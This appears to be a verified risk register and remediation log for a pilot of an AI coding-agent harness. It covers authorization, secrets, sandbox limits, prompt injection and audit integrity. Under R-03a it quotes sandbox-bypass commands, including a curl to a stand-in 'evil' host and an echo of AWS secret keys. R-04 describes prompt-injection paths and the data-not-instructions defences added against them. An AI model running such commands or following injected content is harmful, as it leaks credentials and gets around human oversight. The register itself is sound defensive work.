# Pilot Remediation — Verified Risk Register (50 items)

Program: controlled remediation for a narrow, non-production developer pilot.
Created: 2026-10-17. Method: static verification in this repo (explore passes +
line-level spot-checks by the session model). No production data touched.

> Verification states used below. A risk is only **mitigated** when behavior is
> demonstrated by a test, runtime check, or a reproducible operational procedure.
>
> - `VERIFIED` — code read and/or command output confirmed in this session
> - `VERIFIED-SPOT` — load-bearing claim confirmed by direct spot-check; remainder from
>   an in-session line-cited map (not re-read line by line)
> - `DOCUMENTED` — asserted by repo docs/audits; NOT re-verified in this session
> - `LEAD` — direction plausible, unverified; must be verified before any fix
> - `MITIGATED` — a control exists AND has tests; residual noted
>
> Repo state at registration: branch `master`, HEAD `9f85590`, working tree has
> pre-existing uncommitted edits (`deploy/docker-compose.yml`, `section7/*`) that this
> program did not make and will not revert.

Path shorthand: `S1..S11` = `section1..section11`; `DEP` = `deploy`.

---

## SESSION 1 — five pilot-blocking risk areas (R-01 … R-05)

### R-01 — Authentication, authorization, team/project/tenant isolation
**State: MITIGATED & VERIFIED (S1 remediation).** All five surfaces fixed fail-closed
(S3 bearer+role deps, S2 team-scoped repo access, S5 task/project team binding, S6
create-team binding, S8 role gate + PR scoping) and deploy wiring added in
`deploy/runners/services.py`. Evidence: `session1/S1-R01-authz-isolation.md`
§Verification results (S1/S2/S3/S4/S5/S6/S8/S10/S11 suites green, ruff clean);
explicit residuals listed there. Original evidence (kept for audit):
- **R-01a (S3 unauthenticated):** the entire model router is open. Router deps are
  only a metrics counter (`S3/src/harness_router/api.py:121-126`); mounted via
  `simple_app` with no bearer dep (`DEP/runners/services.py:248-261`); port published
  to `0.0.0.0:8003` (`DEP/docker-compose.yml:291`). Open routes incl. `POST /call`
  (provider spend), `POST /config` (rewrites routing config), `GET /spend` (ledger),
  `GET /metrics`. Anyone with network reach becomes an arbitrary-prompt LLM proxy.
- **R-01b (S5 no tenant scoping):** sandbox task routes gate role only; `principal` is
  never compared to the task/project owner (`S5/src/harness_sandbox/api.py:39-121`).
  Any writer of any team can exec/edit/destroy any known taskId; any reader can browse
  any known project's tree/checkpoints (`S5/.../tree_api.py:118-167`). Task registry is
  in-memory only (`S5/.../local_runner.py:42`).
- **R-01c (S2 read path unscoped):** `GET_REPO` list read has no team filter
  (`S2/src/harness_github/app.py:6`-ish route, spot-checked header block; `SET_REPO`/
  `connect_repo` DO filter by team — asymmetry).
- **R-01d (S6 create meeting unscoped; S8 approve has no role gate):**
  `create_meeting` forwards `req.projectId` without ownership check
  (`S6/.../api.py:210-223`); `POST /reviews/{pr_id}/approve` checks authentication only,
  no `can(principal,"approve")` (`S8/src/harness_review/api.py:145-158`). A guest can
  approve PRs — breaks the human-governance promise.
- **R-01e (OTP brute force):** `verify-otp` has no in-handler limiter
  (`S1/.../app.py:357-361`) BUT `install_rate_limit` IS wired in deploy
  (`DEP/runners/services.py:228`) and `DEFAULT_PROTECTED_ROUTES` covers
  `/auth/verify-otp` (`S1/.../ratelimit.py:104,169-174`). **Correction:** the
  `docs/clientela/raw-22-hardening.md` claim that rate limiting is "dead code" is
  STALE for the deploy path. Residual: 6-digit OTP (`S1/.../auth.py`), multi-IP
  distributed guessing inside TTL, limiter fails open on DB failure (documented
  availability tradeoff). Residual accepted for pilot; monitor.
- Residuals deferred: S4 plan-gate route is scoped (verified ok, `S4/.../plan_gate.py`
  team-scoped); S1 project list/create bind team (verified ok, `S1/.../app.py:495,525`).

### R-02 — Secret protection, key ownership, redaction, revocation
**State: MITIGATED & VERIFIED (S1 remediation).** R-02a/b/c/e/f fixed: S6
decrypts via Section 1's dual-read KDF (derived window first, legacy second)
with explicit vault gating and real deploy wiring for the meeting app; S4
restores the process env exactly after live runs; S2 gained
`POST /github/disconnect` (caller-scoped token deletion); the deploy boot gate
now has subprocess tests. R-02d (master-key rotation) accepted as residual →
session 2 (needs key-versioning). Evidence:
`session1/S1-R02-secret-protection.md` §Verification results. Original
evidence (kept for audit):
- **R-02a (KDF divergence breaks rotated installs):** S1 writes provider keys with the
  salted KDF (`S1/.../crypto.py:295-321`) while S6 decrypts with legacy unsalted
  KeyVault (`S6/.../ai_participant.py:237`; contracts `security.py:12-14`). After
  `reencrypt_vault.py` S6 hits `MalformedTeamKeyError` — availability break.
- **R-02b (hardcoded dev-key fallback vault):** `S6/.../service.py:98-100` builds a
  vault with the public dev constant when none is passed; deploy wires no vault for
  meeting (`DEP/runners/services.py` app_meeting) — silent false confidence.
- **R-02c (engine env restore asymmetry):** `S4/.../engine.py:219-236` sets
  `DEEPSEEK_API_KEY` in `os.environ` and only restores if it was previously set —
  secret persists in process env after first run when originally unset.
- **R-02d (no master-key rotation path):** `reencrypt_all_payloads` re-wraps under the
  SAME master key (`S1/.../crypto.py:351-403`); rotating `HARNESS_MASTER_KEY` renders
  all ciphertext unreadable. No key-version column.
- **R-02e (dev key defaults across sections):** `S1/config.py:9`, `S2/config.py:8`,
  `S8/config.py:8`, `S11/config.py:12`, `S6/service.py:100` default to the public dev
  constant; only `DEP/runners/services.py:22-31` fails fast, and that fail-fast has no
  test (grep "Refusing to start" in tests: 0 hits).
- **R-02f (GitHub token revocation absent):** reconnect overwrites; no revoke/disconnect
  endpoint (`S2/src/harness_github/` — grep "revoke": none).
- MITIGATED controls verified: provider key revoke endpoint + hint-only projection +
  audit (`S1/.../api_keys.py:178-222`); audit detail secret-key scrub
  (`S1/.../audit_emit.py:40-53`); provider error scrub (`S3/.../providers.py:247-250`);
  sandbox env scrub (`S5/.../policy.py:144-180`); no committed credential literals
  (repo-wide grep clean).

### R-03 — Sandbox, filesystem, process, package-install, network boundaries
**State: MITIGATED & VERIFIED (S1 remediation).** R-03a/b/d/e/f fixed
(double-quoted substitution + `find -exec` + `${VAR}` rejected, glob
expansion enforced against forbidden paths, installers blocked, explicit
confinement fails closed incl. landlock child-apply, `HARNESS_` env
stripped, process-group kill + live streaming timeout). R-03c accepted as
residual → pilot decision: sandbox network stays available, now explicit via
`HARNESS_SANDBOX_*` deploy env; egress allow-listing deferred. Evidence:
`session1/S1-R03-sandbox-boundaries.md` §Verification results. Original
evidence (kept for audit):
- **R-03a shell-feature bypasses (exploitable today):** double-quoted `$( )`/backticks
  skipped by the scanner (`S5/.../policy.py:36-40`); `find -exec` allowed (`:44-45,65`);
  shell globs defeat forbidden-paths (`:228-243`); `${VAR}` braced form bypasses the
  sensitive-env pattern (`:207-212`). Confirmed: `echo "$(curl http://evil)"`,
  `find . -exec curl ... \;`, `cat db/*/sensitive/init.sql`, `echo ${AWS_SECRET_ACCESS_KEY}`
  all pass validation; all execute under `/bin/sh`
  (`S5/.../local_runner.py:79`).
- **R-03b installers unconstrained:** `python -m pip install`, `npm i`, `npx --yes`
  pass (no pip/npm-install block, only *publish* blocked, `policy.py:122-124,72-81`);
  `pinned_registries` config never consulted at runtime (`S5/.../egress.py` zero
  callers).
- **R-03c network fully open:** Seatbelt `(allow network*)` (`confinement.py:54`);
  Landlock ignores network (`:147`); compose has no egress restriction and adds
  `extra_hosts: host.docker.internal:host-gateway` (`DEP/docker-compose.yml:344-345`).
- **R-03d confinement fail-open:** Landlock failure returns False with a warning only
  (`confinement.py:149-151`); requested confinement degrades to `off` with a log line
  (`local_runner.py:44-57`).
- **R-03e env leak into agent processes:** `HARNESS_DATABASE_URL` (DB creds) survives
  `sanitize_environment` (`policy.py:168-180` vs `DEP/docker-compose.yml:24`).
- **R-03f destroy/timeout hygiene:** destroy SIGKILLs direct children only — grandchildren
  (npm scripts, `find -exec` children) survive (`local_runner.py:210-223`); streaming
  exec applies the 300s timeout only after EOF (`:134-151`).
- MITIGATED: edit path traversal+symlink guard (`diff_engine.py:22-27`,
  `tree_api.py:88-96`, tested `test_tree_api.py:123-149`); container-level cpus/mem/pids
  caps (`DEP/docker-compose.yml:337-339`); command regex blocks (rm -rf /, mkfs, force-push,
  publish, docker/k8s) with tests.

### R-04 — Prompt-injection and untrusted-input boundaries
**State: MITIGATED & VERIFIED (S1 remediation).** R-04a (transcript moved to
fenced USER-role content + system never-follow rule), R-04b (reviewer/summary
prompts fence untrusted data), R-04d (plan-gate goal bounded to
PROPOSE_GOAL_MAX, model- + route-level tests), R-04e (every MCP tool result —
success and error paths — appends a fixed data-not-instructions framing block,
asserted by conftest for all tool tests). R-04c resolved as a documented
pilot decision: MCP start_run auto-approval KEPT, now explicit in the
LLM-facing description + docstring + note. R-04f documented residual
(inherent repo-content indirect injection; containment unchanged). Also fixed:
MCP server construction broken against installed mcp SDK 1.28.1 (removed
`Server(title=/on_list_tools=/on_call_tool=)` kwargs) — pre-existing, blocked
the whole mcp suite. Evidence: `session1/S1-R04-prompt-injection.md`
§Verification results. Original evidence (kept for audit):
- **R-04a (S6 transcript injected into system role):** participant-authored transcript
  (incl. prior AI replies) concatenated into the SYSTEM message
  (`S6/.../service.py:379-394` → `ai_participant.py:84-93`). No framing/delimiters.
- **R-04b (undelimited untrusted text in reviewer + PR-summary prompts):** diffs/briefs
  interpolated raw (`S4/.../reviewer.py:81-85`; `S8/.../summary.py:151`). Verdict stays
  deterministic (`reviewer.py:40-54`) — good; the human-visible summary text is steerable.
- **R-04c (MCP start_run walks the human approval gate):** propose→approve→start executed
  by the tool itself with a service principal (`mcp/src/harness_mcp/tools.py:62-75`);
  test pins this walk (`mcp/tests/test_tools.py:13-23`). Reviewer/heuristics unchanged;
  but "human plan approval" is bypassed for MCP-originated runs by design — must be a
  conscious pilot decision, documented, not silent.
- **R-04d (unbounded goal on plan-gate route):** `plan_gate.py:98` has no max length
  while `PROPOSE_GOAL_MAX=20_000` exists (`contracts/.../limits.py:38`) and is applied on
  the other route (`S4/.../api.py:486-488`).
- **R-04e (tool outputs unmarked):** MCP/S5 tool results returned raw without
  data-not-instructions framing (`mcp/.../tools.py:26-35`; `local_runner.py:186-195`).
- **R-04f (repo-content indirect injection into builder agent):** the out-of-repo
  deepseek-harness SDK tool loop reads repo content after plan approval; no in-repo
  sanitization is possible; containment = human plan gate + S5 policy + manual merges.
  Residual inherent to the product category; document, don't pretend fixed.
- No injection-specific tests exist (grep `injection|malicious|treat as data`: none).

### R-05 — Audit integrity, safe cancellation, interrupted-run recovery
**State: MITIGATED & VERIFIED (S1 remediation).** R-05a (denial-audit rows
now bind `team_members.id` — non-members NULL, identity in `detail`;
`authz.denied` in the canonical allowlist; test DDL enforces the real FK via
`PRAGMA foreign_keys=ON`, new tests non-vacuous under FK). R-05c (stop
tombstone: PAUSED/user_requested_stop replays as terminal DONE in
`_rehydrate`; events after tombstone inert; done-signals raised; eviction
deliberately still conservative — pinned test preserved). R-05d (queue-mode
resume: regression test reproduced the silent drop — no RESUMED envelope,
claim refused at dispatch; fix drives `sm.resume()` for suspended heads;
restart-replica test now green; resume-on-DONE stays a no-op). R-05e
(`run.started`/`run.stopped` audit rows written by S4 raw-SQL helper at the
start/stop routes; `GET /api/v1/audit` admin-only newest-first bounded page,
team-scoped incl. unbound denial rows via `detail.teamId`). R-05b documented
residual (ORM-scope append-only guard; retention by design). Evidence:
`session1/S1-R05-audit-integrity.md` §Verification results. Original
evidence (kept for audit):
- **R-05a (authz.denied audit silently lost):** `authz.py:127` binds
  `actor_member_id = principal.userId` (users.id) but the column FKs to `team_members(id)`
  (`S1/migrations/0001_initial.sql:99`) → every denial-audit insert FK-fails on Postgres,
  swallowed (`authz.py:135-138`). Test DDL omits the FK so tests can't catch it
  (`S4/tests/unit/test_authz_failclosed.py:85-105`). `authz.denied` also absent from
  `APPEND_ONLY_ACTIONS` (`S1/.../audit.py:7-44`).
- **R-05b (append-only is ORM-only, no tamper evidence):** guard blocks ORM
  update/delete (`audit.py:73-80`); no DB trigger/revoke; no hash chain; direct SQL
  writers bypass the allowlist (`S4/.../plan_gate.py:157-194`; `service.py:753-804`;
  `authz.py:93-138`). Retention deletes audit partitions (`0028_partitioned_retention.sql`).
- **R-05c (stop is not durable):** stop writes only PAUSED(reason=user_requested_stop);
  `finish()` is silent (`state_machine.py:263-266`); post-restart a stopped run reads
  PAUSED + engine_result `not_started`, and can even be walked to DONE by a later
  done-signal (`state_machine.py:206-225`; pinned conservative eviction
  `test_stateless_orchestrator_n1.py:488-502`).
- **R-05d (queue-mode resume/BLOCKED redrive is a silent no-op in production wiring):**
  pause→resume and reaper-BLOCKED→resume enqueue a claim that is then dropped
  (`service.py:1013-1029,1163-1178,1495-1505,1259-1265`; prod wiring
  `DEP/runners/services.py:339-352`). All resume tests are bare-mode; no queue-mode
  resume test exists. Flagged: needs a regression test to confirm/falsify before fix.
- **R-05e (no audit read surface / no run.started-stopped callers):** no `/audit` route
  in any `openapi.json`; `emit_run_started/stopped` have zero production callers
  (`audit_emit.py:274,310`).
- MITIGATED: event persistence + replay + WS with subscribe-before-replay
  (`S1/.../eventbus.py`; `app.py:716-747`); durable queue with DB-clock reaper
  (`run_queue.py:93-141`, tests `test_heartbeat_claims.py`); exactly-once start fences
  (`service.py:1154-1178,828-847`); payload cap on bus (`eventbus.py:367-373`).

---

## SESSION 2 — 25 risks: security hardening, durability, operability
*(Detailed scope re-verified at session start; states below are as-registered.)*

| ID | Risk | Evidence | State |
|----|------|----------|-------|
| R-06 | Default compose publishes ALL backend ports on 0.0.0.0 (8001-8008) with TLS edge (Caddy) only behind opt-in `--profile proxy` | `DEP/docker-compose.yml:243,269,291,320,347,368,389`; Caddy profile `:455-461`; hardening doc A | VERIFIED-SPOT |
| R-07 | Empty `HARNESS_MASTER_KEY` default + per-section dev-key defaults; fail-fast untested | `compose:28`; `services.py:22-31`; R-02e | MITIGATED (S1-R02e: boot-gate tested in `S10/tests/unit/test_deploy_boot_gate.py`; per-section dev defaults = standalone-only residual) |
| R-08 | Crash window between run-state mutation and event publish (no transactional outbox) | `S4/.../service.py:221-266` | VERIFIED-SPOT |
| R-09 | `agent_runs.state` never maintained by orchestrator (read by runs_index; can read stale `idle`) | `runs_index.py:85,145`; `service.py` (no writes) | VERIFIED-SPOT |
| R-10 | Reaper vs live worker: slow worker's run declared FAILED+BLOCKED while thread continues; completion writes RAM-only result + real cost | `service.py:944-951,1353-1406` | VERIFIED-SPOT |
| R-11 | Cost overruns: budgets fail-closed at spawn/review (good) — but no test for the reviewer-fallback path cost honesty; `max_tokens` clamping unverified | `service.py:877-878,1577-1593`; audit doc B | VERIFIED-SPOT |
| R-12 | Provider failure: circuit breaker + heuristic reviewer fallback exist; end-to-end provider-down negative test unverified | `service.py:898-910` | DOCUMENTED |
| R-13 | `/metrics` unauthenticated on services (S3 confirmed); topology disclosure | `S3/api.py:350-356`; `S1/.../observability` wiring | VERIFIED-SPOT |
| R-14 | Retention deletes `agent_events` + `audit_log` partitions; default windows need operator documentation | `0028_partitioned_retention.sql`; `events_retention.py` | VERIFIED-SPOT |
| R-15 | Backup/restore: WAL-G wiring exists, runbook exists; no restore drill evidence in repo | `docs/runbooks/backup-and-pitr.md`; `compose:150,540` | DOCUMENTED |
| R-16 | SSRF lead: S2 repo-URL fetch (likely mitigated — client pinned to api.github.com) | `S2/client.py:48-51`; audit doc C | LEAD |
| R-17 | Session/token hygiene: raw sha256 token hashes (fine for high-entropy), 6-digit OTP residual, no `hmac.compare_digest` anywhere | `fastapi_auth.py:60-63`; `auth.py`; audit doc D | VERIFIED-SPOT |
| R-18 | CORS wildcard+credentials combo not validator-blocked | `S1/app.py:63-69`; audit doc A | DOCUMENTED |
| R-19 | `/docs`, `/redoc`, `/openapi.json` served in production; schema disclosure | all sections (FastAPI defaults) | DOCUMENTED |
| R-20 | Input caps incomplete: plan-gate goal unbounded (see R-04d), comment/meeting title caps, UUID parsing | audit doc B; `plan_gate.py:98` | VERIFIED-SPOT |
| R-21 | Rate limiter fails OPEN on DB failure (documented availability tradeoff) — confirm acceptable + observable | `ratelimit.py`/`services.py:227` comment | DOCUMENTED |
| R-22 | Single-replica assumptions: S5 in-process task registry lost on restart; multi-replica split state | `local_runner.py:42,210-223` | VERIFIED |
| R-23 | Sandbox workspace disk retention/cleanup policy absent | `local_runner.py:89`; `config.py:11` | VERIFIED-SPOT |
| R-24 | Migration discipline: numbered-only + ledger exists; rollback policy for 0028-style retention changes undocumented for pilot ops | `S1/migrations/`; `migrate` compose service | DOCUMENTED |
| R-25 | Deployment: judge/probe scripts and loadtest profile carry dev literals (`POSTGRES_PASSWORD: harness`) | `compose:910,970-971` | VERIFIED |
| R-26 | Error envelope installed everywhere (good) — residual: `str(e)` passthrough on S3 errors needs scrub audit | `S3/api.py:222-236` | VERIFIED-SPOT |
| R-27 | Event duplicates possible (no unique `(run_id,type)`); consumers must dedupe by seq | `0001:155-164` | VERIFIED-SPOT |
| R-28 | GitHub OAuth token stored encrypted (good); no revoke/disconnect endpoint (see R-02f) — pilot offboarding gap | `S2/app.py:217-234` | MITIGATED (S1-R02f: `POST /github/disconnect`, caller-scoped, tested) |
| R-29 | Engine SDK pin (`deepseek-harness-sdk 0.1.1rc1`) + bundled node runtime: supply-chain surface; task0 re-verify protocol exists | `DEP/backend.Dockerfile:18`; `task0/` | DOCUMENTED |
| R-30 | Audit read API absent (R-05e) — pilot operators cannot review audit without SQL | grep openapi.json | VERIFIED |

## SESSION 3 — 20 risks: privacy, compliance, support, usability, integrations,
model quality, competitive/commercial
*(Each requires re-verification at session start; several are program/strategy, not code.)*

| ID | Risk | Evidence | State |
|----|------|----------|-------|
| R-31 | PRIVACY.md skeleton pending counsel review | `PRIVACY.md:1-10` | VERIFIED |
| R-32 | TERMS.md skeleton pending counsel; MIT license choice flagged as decision point | `TERMS.md:1`; `LICENSE` header comment | VERIFIED |
| R-33 | Telemetry: `promptText` gating exists; default posture for pilot needs sign-off | `S10/.../telemetry.py:60-106` | VERIFIED-SPOT |
| R-34 | Data retention windows (events/audit/sandboxes) not stated in operator docs as a single table | `docs/runbooks/`; R-14 | DOCUMENTED |
| R-35 | Support: no pilot support process/SLA documented (runbooks cover ops, not support intake) | `docs/runbooks/` | DOCUMENTED |
| R-36 | Usability: verified tutorial exists (good); no E2E demo-path tests (audits flag F3) | `docs/TUTORIAL.md`; `docs/audits/2026-08-23-testing-qa-brutal-audit.md` | DOCUMENTED |
| R-37 | Banner/status truthfulness: UI claims vs verified behavior (pilot credibility) | `section7/app/*` | LEAD |
| R-38 | Integrations: Stripe adapter + webhooks skeleton (M3) — disable or verify before pilot | `S1/.../stripe_adapter.py` | DOCUMENTED |
| R-39 | Integrations: MCP server OAuth/service-token model — pilot decision recorded? | `mcp/src/harness_mcp/config.py:12-18` | VERIFIED-SPOT |
| R-40 | Model quality: reviewer verdicts deterministic heuristics (good); LLM summary quality unmeasured | `S4/reviewer.py:40-54` | VERIFIED |
| R-41 | Model quality: RAG planner/context pillar marked "complete" in git log but rules/context blocks are stored-not-injected (docs overstate) | `S4/service.py:579-605`; `docs/extensions.md:126-152` | VERIFIED-SPOT |
| R-42 | Competitive displacement: product differentiation (governance + sandbox + audit) must be demo-able for pilot | `README.md`; `docs/clientela/` | DOCUMENTED |
| R-43 | Commercial viability: PRICING.md mapped to real caps (good); MIT decision + Stripe skeleton = commercial readiness gap | `PRICING.md`; `LICENSE` | VERIFIED-SPOT |
| R-44 | Compliance: audit retention/customer data posture for pilot agreements | R-14/R-34 | DOCUMENTED |
| R-45 | SSO/OIDC (M4): config CRUD + PKCE tests exist; pilot need-by decision | `S1/.../sso.py`; `test_sso_oidc.py:620-830` | VERIFIED-SPOT |
| R-46 | Onboarding: guided demo + checklist exist (S10) but not deployed as service; pilot onboarding path is TUTORIAL | `S10/src/harness_onboarding/`; not in `SERVICES` | VERIFIED |
| R-47 | Frontend auth flows: uncommitted work in section7 (login ticketing?) needs review before pilot | `git status` (pre-existing edits) | VERIFIED |
| R-48 | Rate-limit UX: 429 behavior for humans mid-pilot (tuning) | `ratelimit.py` G2 budgets | DOCUMENTED |
| R-49 | Model provider config UI/API read-back never returns keys (good); pilot operator docs for BYO keys | `S3/catalog.py:42-75` returns env names only | VERIFIED-SPOT |
| R-50 | Long-tail input hygiene: control chars in S6 content (log/UI injection), subject CRLF (notifier) | audit doc B/C | DOCUMENTED |

---

## Program corrections log (claims falsified this session)
1. `docs/clientela/raw-22-hardening.md` A: "rate limiting is dead code in production" —
   **FALSE for deploy path**: `install_rate_limit` is installed at
   `DEP/runners/services.py:228` with broad coverage (`ratelimit.py:169-174`).
2. Same doc A: "verify-otp brute-forceable with unlimited attempts" —
   **MITIGATED in deploy wiring** by the DB-backed limiter; in-handler limiter absent
   but irrelevant when middleware is installed. Residual (multi-IP) remains.
3. Explore-pass claim "S10 unauthenticated service" — **S10 is not a deployed
   service** (absent from `SERVICES`, `DEP/runners/services.py:583` and compose).
   Downgraded to R-46.

---

## Session 2/3 closure pass (2026-10-17)

Method: session-3 re-verification against current HEAD (`272bb8d` + working
tree); full item-by-item mapping in `RECONCILIATION_MATRIX.md`.

**Closed / upgraded this pass:**
- R-10 → MITIGATED (heartbeat-staleness env override, default 90 s documented;
  `S4/.../run_queue.py:29-38`).
- R-14 → PARTIAL: prune windows shipped (M19-N3, `DEP/docker-compose.yml:678`,
  `0028`); operator retention table still owed to R-34.
- R-15 → FIXED (PITR rehearsal evidence: `docs/briefs/m18-c6-rehearsal-evidence.md`).
- R-28 → FIXED (`POST /github/disconnect`, S1-R02f).
- R-30 → FIXED (`GET /api/v1/audit`, team-scoped admin page, S1-R05e).
- R-36 → FIXED: TUTORIAL + live hero journey reproduced (session 2);
  E2E-in-CI shipped 2026-10-17 (`e2e-compose`, see OPS-20 below).
- R-38 / R-39 / R-45 → FIXED per program close (Stripe rails / MCP server /
  OIDC SSO incl. rate-limited login edges, verified at HEAD).
- R-47 → CLOSED: frontend work committed at `923711f`; tree clean.
- S2-D1…D6 (session-2 report defects, outside R-01…R-50) → all FIXED; see
  `session2/README.md` (final) and the matrix §B.
- **M23-A** approval expiry (area 16 / S2-D4) → FIXED: TTL 24 h via
  `HARNESS_PLAN_APPROVAL_TTL_SECONDS`, `plan_approved_at` + `approvedAt`
  payload, enforced in the state machine AND durably against the event log;
  `PlanNotApprovedError` → 409; 11 regression tests; S4 suite 503/5 skip.
- **M23-B** budget warnings (area 9 / S2-D5) → FIXED:
  `HARNESS_TEAM_BUDGET_WARN_PCT` (default 80), `BudgetStatus.warned`/
  `warnAtUsd`, once-per-run log, run-aggregate + API exposure; 10 regression
  tests; S4 suite 503/5 skip.
- **MAC2-F4** (m17-findings-mac2) → FIXED (2026-10-17):
  `/api/v1/invites/redeem` added to `DEFAULT_PROTECTED_ROUTES`; new
  `/api/v1/ws-ticket` route wired with `WS_TICKET_LIMIT=60` in
  `EXPENSIVE_OP_LIMITS`; `test_ratelimit_mac2f4.py` (6 tests); S1 suite 639/10.
- **OPS-20** → FIXED (2026-10-17): `e2e-compose` job in
  `.github/workflows/ci.yml` runs the full 12-check compose journey on every
  push with a migrate exit-code gate and failure-artifact upload;
  `make e2e-compose` + `docs/ci-gates.md` row. Journey verified green twice
  live (direct + via Makefile).
- **Section-B adversarial wave** → FIXED (2026-10-17): replay terminal sealing
  (post-terminal rows can no longer resurrect a DONE run; both replay walks
  guarded) found by new adversarial tests; 20-test 10×16 transition matrix
  (`test_state_machine_adversarial.py`); demo fixture re-curated to an
  H-008-legal sequence; S4 suite 526/7 skip; journey 12/12 after rebuild.
  Noted (by design, not fixed): state-machine mutators enforce only the
  liveness half of H-007/H-008 — role/diff-evidence gating lives in
  `signals.py` + service layer.
- **Heartbeat-claims flake (recorded earlier as non-reproducible) →
  ROOT-CAUSED + FIXED (2026-10-17)**: `test_reaper_leaves_healthy_claims_untouched`
  flaked because its cleanup cancelled a task whose engine call runs on an
  uninterruptible executor thread, and when cancellation landed mid-DB-await
  the service's finally-block `finish_run` could await a StaticPool/aiosqlite
  connection poisoned by the abandoned op (test-env artifact; production uses
  asyncpg pools — noted as a latent fragility of await-in-finally under
  cancellation). Test cleanup now uses a release-able thread block + bounded
  loop pump; 0/80 solo runs (was 4–5/60), S4 suite green twice (526/7).
- **E2E-found live bugs** → FIXED: demo-seed FK insert order on PG (M18-C8);
  audit JSONB `LIKE` 500 (CAST fix); landlock version-heuristic vs. Docker
  seccomp (M18-C9: runtime syscall probe + honest `auto` degradation).
  S5 suite 181/1 skip.

Final wave report (verdict, scorecard, evidence ledger):
`docs/pilot-remediation/FINAL_REPORT.md`.

**Still open after this pass (entering the next wave):**
- Program/strategy items R-31, R-32, R-34, R-35, R-41 (residual), R-43, R-44,
  R-46, R-49, R-50 remain registers-as-is; several are counsel/decision lanes,
  not code.
- External-provider live drills (Stripe test-mode, live IdP, real object
  store, model-provider keys): procedures in
  `docs/runbooks/external-validation.md`; until executed they stay
  HUMAN DECISION REQUIRED. (Wave 2 supersedes the SPA-callback gap noted
  here — see the wave-2 section below.)

---

## Nightly-CI unblock + close-out pass (2026-10-17, wave 2)

Method: after the wave-1 commits, `gh run list` showed EVERY scheduled run red
since the origin tip (`9f85590`). Root-caused the whole board, fixed it, then
executed the FINAL_REPORT §7 close-out list. All evidence commands ran locally
under the same env CI uses (`HARNESS_TEST_PG=1`, compose PG on :5499).

**Origin-CI root causes → FIXED (commits `7af0381`, `88bb78f`, `6537caf`):**
- `pytest (section3/section6)`: `ModuleNotFoundError: No module named
  'greenlet'` — async SQLAlchemy needs the asyncio extra; both pyprojects now
  pin `sqlalchemy[asyncio]>=2.0`.
- `nightly real-PG probe`: `No module named pytest` — the probe venv
  installed section1 without `[dev]`; the pg-probe job now installs
  `-e ".[dev]"`.
- `security scan`: gitleaks "Leaks detected" — 5 findings, ALL hand-verified
  fakes (fixture keys/hashes + one `HARNESS_ENV=dev` docstring). **OPS-21**:
  repo `.gitleaks.toml` allowlist (applies to history scans; inline comments
  cannot silence old commits) + inline `# gitleaks:allow` on the 4 test
  files. Full-history rescan (281 commits): 0 findings.
- `pytest (section4)` on origin: unexplained on the old revision; re-verified
  green at HEAD (526/7) — subsumed by the wave-2 fixes.

**Masked by the probe install bug (those probes had NEVER run in CI) — found
and fixed, `6537caf` + `fae0600`:**
- `test_fk_deletion_story`: live `cost_ledger_daily.team_id` FK was NO ACTION
  — 0027 shipped it without CASCADE while the deletion map (`DELETION_MAP`)
  and the ORM model both say CASCADE. Migration `0034` aligns it (law: never
  edit a landed migration). `migrate_selftest`: 33 migrations 0001→0034,
  re-run idempotent.
- Probe rot, each fixed at its root: f1 idempotency test read
  `HARNESS_TEST_PG` as a DSN (it is the flag; DSN lives in
  `HARNESS_DATABASE_URL`) · partitioned-retention probes hardcoded the
  Aug-2026 epoch (now passed explicitly through the runner's `now=` seam,
  `_FROZEN_NOW`) · runs-index seed anchored pre-Sep-2026 so rows land in the
  legacy child the plan pin names · money boundary scenario predates M18-C2
  team-first cap order (team budget now NULL → plan tier governs, matching
  the scenario's own comment).
- Integration checkpoint `test_orchestrator_rehydrates_state_from_event_log`
  had two stale layers: a hermetic schema without the SQL-side
  `agent_runs.pr_id` (M15-D1: no ORM mirror — helper now pins the migrated
  shape) and — REAL BUG — `_rehydrate`'s PLAN_APPROVED fallback used
  `rd.setdefault("plan_id", …)` on a pre-seeded `None` key, so pre-mirror
  legacy logs never recovered their `planId` on replay. Now a guarded
  assignment.

**§7 close-out:**
- Rollup "10k latency" anomaly → CLOSED, not reproducible (hermetic
  `test_cost_rollup.py` 14 passed/1.11 s; live-PG variant 4 passed; original
  failing command never provided — operable to re-open if it resurfaces).
- mcp version decision → RESOLVED + PINNED: `mcp>=1.2,<2` (`88bb78f`).
  Evidence: mcp 1.30.0 → 18/18; mcp 2.1.1 (S11 venv) → 1 failed/13 errors.
- SPA SSO callback (F-gap) → BUILT (`412fc30`): login SSO entry +
  `/auth/sso/callback` page, pending-attempt stash, byte-exact redirectUri
  replay, honest error states; frontend 507/507 + `tsc`. Live IdP drill
  still creds-blocked.
- `.DS_Store` hygiene → gitignored + 3 tracked-copy removals.
- Branch protection: repo has NONE today (`gh api … /branches/master/
  protection` → 404). NOT created unilaterally — add `e2e-compose` and the
  migrate job (both run per-PR; the pg-probe job is schedule-gated and
  unsuitable as a required check) once CI is green on origin; skeleton in
  FINAL_REPORT §7/§8.

**Post-fix probe parity (local, CI-identical env):** S1 offline 639/10 skip ·
S1 live-PG 649/0 skip · integration probe 4/4 · migrate 33 idempotent · S4
526/7 skip · frontend 507/507 + tsc · gitleaks full-history 0 findings.

**Still open after wave 2:**
- External-provider drills (unchanged): `docs/runbooks/external-validation.md`
  — SSO row now reads: SPA callback BUILT; blocked on IdP creds.
- Push/promotion is a human gate: wave-2 work is committed LOCALLY
  (`7af0381`, `88bb78f`, `6537caf`, `fae0600`, `412fc30`); nothing pushed.
- R-31, R-32, R-34, R-35, R-41 (residual), R-43, R-44, R-46, R-49, R-50:
  registers-as-is (decision/counsel lanes).
